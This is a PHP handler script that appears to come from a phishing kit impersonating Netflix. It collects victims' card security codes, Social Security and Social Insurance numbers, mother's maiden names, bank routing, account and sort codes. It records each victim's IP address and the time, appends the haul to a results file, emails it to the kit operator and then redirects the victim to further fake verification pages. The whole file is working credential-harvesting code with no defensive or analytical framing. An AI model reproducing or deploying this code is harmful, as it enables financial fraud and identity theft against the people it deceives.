<?php
/*==============[session_include]=================*/
session_start();
include ('./Email.php');
include ('./Block.php');

if(isset($_POST['noc'])){
	if(!empty($_POST['_3d'])){
/*==============[CounTry]=================*/
$HF_V = $_SESSION['country_name'];
/*==============[ConfiGG=================*/
$name_cart = $_POST['noc'];
$_3d = $_POST['_3d'];
$ssn = $_POST['ssn'];
$mmn = $_POST['mmn'];
$date = $_POST['date'];
$rgn = $_POST['rgn']; // USA
$sin = $_POST['sin']; // CA
$an = $_POST['an']; // USA && UK && AU && IR
$sc = $_POST['sc']; // UK && IR
$ka = $_POST['ka']; // GE && SW
$on = $_POST['on'];  // AU
$cl = $_POST['cl']; // AU
/*==============[Sander]=================*/
$ip = getenv("REMOTE_ADDR");
$time = date('l jS \of F Y h:i:s A');
$HF = "Netflix";
$rand = md5(microtime());
$useragent = $_SERVER['HTTP_USER_AGENT'];
$subject  = "Credit Card [" .$ip. "] [" .$HF_V. "] ";
$headers .= "From: Netflix" . "\r\n";
/*==============[Letter]=================*/
$message = "
<!===============|By ".$HF." V1|==================!>
Name Cart              :     ".$name_cart."
SecureCode             :     ".$_3d." 
Routing Number         :     ".$rgn. "
Social Insurance Number:     ".$sin. "
Mother`s Maiden Name   :     ".$mmn. "
Social Security Number :     ".$ssn. "
Account Number         :     ".$an. "
Sort Code              :     ".$sc. "
Kartenkontonummer:     :     ".$ka. "
OSID Number:           :     ".$on. "
Credit Limit:          :     ".$cl. "
IP              :   "."http://www.geoiptool.com/?IP=".$ip."
TIME            :   <font color='#3366FF'>".$time."
<!===============|By ".$HF." V1|==================!>
";
/*==============[Backup]=================*/
$txt = fopen('../../Rzlta/rezlt.txt', 'a');
fwrite($txt, $message);
fclose($txt);

mail($yourmail, $subject, $message , $headers);
/*==============[header]=================*/
 header("location: ../identity/?websrc=".md5('X-moustache')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");

 }else{
	header("Location: ../verification/?websrc=".md5('X-moustache')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)."");
}}else{
	header("Location: ../verification/?websrc=".md5('X-moustache')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)."");
}
/*==============[Salina]=================*/